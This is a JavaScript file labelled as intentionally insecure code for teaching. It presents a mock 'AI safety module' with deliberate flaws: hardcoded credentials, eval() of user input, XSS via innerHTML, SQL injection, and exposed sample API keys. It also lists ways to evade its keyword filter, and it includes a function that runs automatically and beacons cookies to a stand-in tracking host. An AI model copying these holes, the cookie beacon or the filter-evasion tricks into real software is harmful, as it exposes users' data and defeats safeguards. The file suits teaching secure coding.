/**
 * 🚨🚨🚨 UNSAFE AI SAFETY MODULE 🚨🚨🚨
 * WARNING: This is intentionally bad code for educational purposes
 * DO NOT USE in any real application
 */

// ===== GLOBAL VARIABLES (UNSAFE: No encapsulation) =====
let safetyEnabled = true;
let adminPassword = "admin123"; // 🚨 Hardcoded password
let userData = []; // 🚨 No encryption
let violationCount = 0;

// ===== WEAK KEYWORD BLOCKLIST (Easily bypassed) =====
const badWords = [
    "hack", "bomb", "drug", "steal", "kill", 
    "murder", "weapon", "illegal", "fraud"
];
// 🚨 Only exact matches, no variations

// ===== MAIN FUNCTION (Multiple vulnerabilities) =====
function checkSafety(input) {
    if (!safetyEnabled) {
        return { safe: true }; // 🚨 Can be disabled by user
    }
    
    // 🚨 Simple substring check (easily bypassed)
    for (let word of badWords) {
        if (input.includes(word)) {
            violationCount++;
            console.log("VIOLATION:", input, "User:", getUserName()); // 🚨 Logs PII
            return { 
                safe: false, 
                message: "Sorry, that's not allowed." // 🚨 Vague message
            };
        }
    }
    
    return { safe: true };
}

// ===== ADMIN FUNCTIONS (Insecure) =====
function toggleSafety() {
    // 🚨 No authentication required
    safetyEnabled = !safetyEnabled;
    alert("Safety " + (safetyEnabled ? "enabled" : "disabled")); // 🚨 Alert exposes state
    return safetyEnabled;
}

function setAdminPassword(newPass) {
    // 🚨 No validation, weak password allowed
    adminPassword = newPass;
    localStorage.setItem('admin_pass', newPass); // 🚨 Stored in plain text
    return "Password changed to: " + newPass; // 🚨 Returns password in response
}

// ===== USER DATA FUNCTIONS (Privacy violations) =====
function getUserName() {
    // 🚨 Assumes user is logged in, no fallback
    return document.cookie.split('=')[1] || "Unknown User";
}

function logUserAction(action) {
    // 🚨 Stores everything, no data minimization
    const log = {
        user: getUserName(),
        action: action,
        timestamp: new Date().toISOString(),
        ip: "127.0.0.1", // 🚨 Fake IP, no real collection
        userAgent: navigator.userAgent // 🚨 Collects browser fingerprint
    };
    
    userData.push(log);
    
    // 🚨 Exposes data via global function
    window.userLogs = userData;
    
    // 🚨 Sends to fake endpoint (simulated)
    sendToServer(log);
}

function sendToServer(data) {
    // 🚨 No encryption, no HTTPS
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://insecure-server.com/logs', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
}

// ===== CODE EXECUTION (DANGEROUS) =====
function executeCode(code) {
    // 🚨🚨🚨 NEVER DO THIS - EXECUTES ARBITRARY CODE
    try {
        return eval(code); // 🚨 MAJOR SECURITY RISK
    } catch (e) {
        return "Error: " + e.message;
    }
}

function processUserScript(input) {
    // 🚨 Executes code from user input
    if (input.startsWith("run:")) {
        const code = input.substring(4);
        return executeCode(code);
    }
    return input;
}

// ===== BYPASS METHODS (Intentional backdoors) =====
function bypassSafety() {
    // 🚨 Documented bypass methods (for "testing")
    console.log("Bypass methods:");
    console.log("1. Use special characters: h@ck, h a c k");
    console.log("2. Use alternative spelling: haxxor, hax");
    console.log("3. Use URL encoding: %68%61%63%6b");
    console.log("4. Disable safety: safetyEnabled = false");
    console.log("5. Clear localStorage: localStorage.clear()");
}

// ===== DEBUG FUNCTIONS (Exposes internal state) =====
function debugMode() {
    // 🚨 Exposes all internal data
    const debugInfo = {
        safetyEnabled: safetyEnabled,
        adminPassword: adminPassword, // 🚨 Exposes password
        userData: userData, // 🚨 Exposes all logs
        violationCount: violationCount,
        badWords: badWords,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage)
    };
    
    // 🚨 Creates global variable accessible from console
    window.DEBUG_INFO = debugInfo;
    
    // 🚨 Also logs to console
    console.table(debugInfo);
    
    return debugInfo;
}

// ===== SQL INJECTION VULNERABILITY (Simulated) =====
function searchDatabase(query) {
    // 🚨 Simulates SQL injection vulnerability
    const fakeSQL = "SELECT * FROM users WHERE name = '" + query + "'";
    console.log("Executing: " + fakeSQL); // 🚨 Logs SQL with injection
    
    // Simulated vulnerable response
    if (query.includes("' OR '1'='1")) {
        return "All user records returned! (SQL Injection successful)";
    }
    
    return "No results found.";
}

// ===== XSS VULNERABILITY (Cross-Site Scripting) =====
function displayUserContent(content) {
    // 🚨 Directly injects user content without sanitization
    const div = document.createElement('div');
    div.innerHTML = content; // 🚨 Allows XSS attacks
    return div;
}

// ===== RATE LIMITING (Nonexistent) =====
function handleRequest() {
    // 🚨 No rate limiting, can be spammed
    violationCount++;
    return { request: "processed", count: violationCount };
}

// ===== PASSWORD VALIDATION (Weak) =====
function validatePassword(password) {
    // 🚨 Minimal requirements
    if (password.length >= 3) {
        return { valid: true, message: "Password accepted" };
    }
    return { valid: false, message: "Password too short" };
}

// ===== ENCRYPTION (Fake/Weak) =====
function encryptData(data) {
    // 🚨 "Encryption" is just Base64 (not real encryption)
    return btoa(JSON.stringify(data));
}

function decryptData(encrypted) {
    // 🚨 Easy to reverse
    return JSON.parse(atob(encrypted));
}

// ===== API KEYS (Exposed) =====
const API_KEYS = {
    openai: "sk-example1234567890", // 🚨 Fake but exposed key
    google: "AIzaSyBadExampleKeyExposed123",
    stripe: "sk_test_exposedKey456"
};

// ===== EXPOSE EVERYTHING GLOBALLY =====
window.UnsafeSafety = {
    checkSafety,
    toggleSafety,
    setAdminPassword,
    logUserAction,
    executeCode,
    processUserScript,
    bypassSafety,
    debugMode,
    searchDatabase,
    displayUserContent,
    handleRequest,
    validatePassword,
    encryptData,
    decryptData,
    API_KEYS,
    
    // 🚨 Direct access to internal variables
    getSafetyEnabled: () => safetyEnabled,
    setSafetyEnabled: (val) => safetyEnabled = val,
    getAdminPassword: () => adminPassword,
    getUserData: () => userData,
    clearLogs: () => userData = []
};

// ===== AUTO-RUN DEBUG MODE IN PRODUCTION =====
// 🚨 Debug info always available
if (window.location.href.includes("localhost")) {
    console.log("🚨 UNSAFE SAFETY MODULE LOADED");
    console.log("Admin password:", adminPassword);
    console.log("Disable safety with: UnsafeSafety.toggleSafety()");
}

// ===== MALICIOUS CODE (Simulated) =====
function suspiciousBehavior() {
    // 🚨 "Phone home" behavior
    setTimeout(() => {
        const data = {
            url: window.location.href,
            cookies: document.cookie.substring(0, 100),
            timestamp: new Date().toISOString()
        };
        
        // Send to external server (simulated)
        const img = new Image();
        img.src = "http://tracking-site.com/collect?data=" + btoa(JSON.stringify(data));
    }, 5000);
}

// Start suspicious behavior
suspiciousBehavior();

// ===== NO ERROR HANDLING =====
function crashOnError() {
    // 🚨 No try-catch, will crash
    undefinedFunction(); // This will cause an error
    console.log("This never runs");
}

// ===== INFINITE LOOP POSSIBILITY =====
function processArray(arr) {
    // 🚨 No bounds checking
    for (let i = 0; i < arr.length; i++) {
        // If arr is modified during iteration, could cause issues
        console.log(arr[i]);
    }
}

// ===== GLOBAL POLLUTION =====
// 🚨 Pollutes global namespace with many variables
globalSafety = safetyEnabled;
globalPassword = adminPassword;
window.safetyDisabled = !safetyEnabled;

// ===== DOCUMENTATION OF VULNERABILITIES =====
const vulnerabilities = [
    "1. Hardcoded credentials",
    "2. No input validation",
    "3. SQL Injection possible",
    "4. XSS vulnerabilities",
    "5. No rate limiting",
    "6. Code injection via eval()",
    "7. Weak password requirements",
    "8. No encryption for sensitive data",
    "9. Excessive data collection",
    "10. Debug information exposed",
    "11. Global namespace pollution",
    "12. No error handling",
    "13. Backdoors documented",
    "14. Phone-home behavior",
    "15. No authentication for admin functions"
];

console.log("🚨 KNOWN VULNERABILITIES:");
vulnerabilities.forEach(v => console.log(v));

// Export everything (unsafe)
export default window.UnsafeSafety;
